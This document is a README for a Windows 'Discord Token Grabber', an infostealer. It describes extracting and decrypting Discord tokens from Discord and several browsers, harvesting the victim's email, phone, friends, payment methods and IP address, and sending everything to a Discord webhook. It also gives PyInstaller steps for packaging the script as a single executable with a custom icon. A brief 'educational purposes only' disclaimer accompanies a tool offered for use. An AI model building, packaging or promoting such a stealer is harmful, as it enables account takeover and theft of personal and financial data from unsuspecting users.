# Discord Token Grabber

This script extracts Discord tokens and user information from various applications on a Windows system and sends the collected data to a specified webhook.

**⚠️ Disclaimer**: This code is provided for educational purposes only. Unauthorized access to user data or tokens is illegal and unethical. Use this code responsibly and only with explicit permission from the data owner.

## Features
- Extracts Discord tokens from multiple applications (e.g., Discord, Chrome, Brave, Opera, etc.).
- Retrieves user information such as username, email, phone number, friends, guilds, Nitro status, and payment methods.
- Decrypts encrypted tokens using Windows CryptUnprotectData and AES decryption.
- Sends collected data to a Discord webhook in a formatted embed.
- Retrieves the user's public IP address.

## Prerequisites
- **Operating System**: Windows (the script checks for `os.name == "nt"` and exits if not Windows).
- **Python Version**: Python 3.6 or higher.
- **Dependencies**:
  - `pypiwin32` (for `win32crypt`)
  - `pycryptodome` (for AES decryption)

## Installation
1. Clone or download the script to your local machine.
2. Install the required Python packages by running the script, which will automatically install missing dependencies:
   ```bash
   python main.py

## Convertion into a .exe

Run the following command to convert the script to a .exe file
```bash
python -m PyInstaller --onefile main.py
```

(Optional) To add a custom icon to the executable, use that command and replace icon.ico with your icon
```bash
python -m PyInstaller --onefile --icon=icon.icon main.py
```
